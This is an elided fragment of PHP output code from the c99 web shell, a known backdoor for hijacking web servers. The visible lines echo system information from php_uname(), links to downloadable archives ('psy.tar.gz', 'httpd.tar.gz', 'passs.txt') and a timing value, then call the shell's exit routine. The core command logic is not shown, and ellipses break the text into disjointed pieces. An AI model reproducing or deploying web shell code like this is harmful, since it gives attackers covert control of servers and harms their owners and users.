...
?><?php echo wordwrap(php_uname()); ?><?php echo $wdt; ?><?php /* FaTaLisTiCz_yx TriCkz */ ?><?php echo $dispd; ?><?php
    ...
    ?><?php echo htmlspecialchars($arg1); ?><?php echo htmlspecialchars($arg2); ?><?php echo $sh_mainurl."passs.txt"; ?><?php echo $sh_mainurl."psy.tar.gz"; ?><?php echo $sh_mainurl."httpd.tar.gz"; ?><?php echo $dispd; ?><?php echo $dispd; ?><?php echo $dispd; ?><?php echo $wdt; ?><?php echo $dispd; ?><?php echo $dispd; ?><?php echo round(getmicrotime()-starttime,4); ?><?php chdir($lastdir); c99shexit(); ?>